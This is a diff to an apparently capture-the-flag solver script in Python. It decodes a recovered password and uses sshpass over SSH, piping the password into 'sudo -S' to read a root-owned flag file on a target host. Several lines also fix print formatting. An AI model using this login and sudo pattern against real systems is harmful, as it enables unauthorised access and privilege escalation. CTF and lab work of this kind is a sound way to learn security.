@@ -96,15 +96,15 @@ def get_password():
 	password = base64.b64decode(second_pass).decode()
 
 	print('Password cracked\n')
-	print('password: {password}')
+	print(f'password: {password}')
 	return password
 
 
 def get_flag_3():
-	file_to_read = "/home/ns/flag3.txt"
+	file_to_read = "/flag4.txt"
 
 	# construct the bash command
-	command = f'sshpass -p {password} ssh {username}@{hostname} "cat {file_to_read}"'
+	command = f'sshpass -p {password} ssh {username}@{hostname} "echo {password} | sudo -S cat {file_to_read}"'
 
 	# execute the command and capture the output
 	output = subprocess.check_output(command, shell=True)
@@ -114,7 +114,7 @@ def get_flag_3():
 
 	#print flag
 	if flag3:
-		print("Flag 3 found: {flag3}")
+		print(f"Flag 3 found: {flag3}")
 	else:
 		print("Flag 3 not found\n")
 
@@ -140,7 +140,7 @@ if __name__ == '__main__':
 
 
 	flag1 = get_flag_1()
-	flag2 = get_flag_2()
+	# flag2 = get_flag_2()
 	password = get_password() 
 
 	flag3 = get_flag_3()
